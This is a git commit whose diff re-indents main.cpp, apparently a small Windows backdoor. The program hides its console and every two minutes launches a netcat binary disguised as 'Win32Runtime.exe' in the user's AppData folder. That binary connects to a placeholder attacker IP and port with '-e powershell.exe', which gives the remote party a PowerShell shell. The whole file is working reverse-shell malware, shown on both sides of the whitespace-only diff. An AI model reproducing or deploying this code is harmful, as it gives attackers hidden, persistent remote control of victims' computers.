55f4b05fd0bf717111da39ca193506e2378b038e
Ethan <45067032+EKO135@users.noreply.github.com>
2020-07-15 11:31:38 +1000

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -6,29 +6,29 @@
 
 int main()
 {
-  // hide window
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+    // hide window
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-  // getting the ncat path in string
-	TCHAR username [ UNLEN + 1 ];
-	DWORD size = UNLEN + 1;
-	GetUserName((TCHAR*)username, &size);
+    // getting the ncat path in string
+    TCHAR username [ UNLEN + 1 ];
+    DWORD size = UNLEN + 1;
+    GetUserName((TCHAR*)username, &size);
 
-  std::string ncCommand = "C:\\Users\\";
-	ncCommand += username;
-	ncCommand += "\\AppData\\Local\\Win32Runtime.exe [attacker-IP] [port] -e powershell.exe";
+    std::string ncCommand = "C:\\Users\\";
+    ncCommand += username;
+    ncCommand += "\\AppData\\Local\\Win32Runtime.exe [attacker-IP] [port] -e powershell.exe";
 
-  STARTUPINFO info={sizeof(info)};
-  PROCESS_INFORMATION processInfo;
+    STARTUPINFO info={sizeof(info)};
+    PROCESS_INFORMATION processInfo;
 
-  while(1)
-  {
-    Sleep(120000);
+    while(1)
+    {
+        Sleep(120000);
 
-    CreateProcess(NULL, LPSTR(ncCommand.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
-    WaitForSingleObject(processInfo.hProcess, INFINITE);
+        CreateProcess(NULL, LPSTR(ncCommand.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
+        WaitForSingleObject(processInfo.hProcess, INFINITE);
 
-    CloseHandle(processInfo.hProcess);
-    CloseHandle(processInfo.hThread);
-  }
+        CloseHandle(processInfo.hProcess);
+        CloseHandle(processInfo.hThread);
+    }
 }
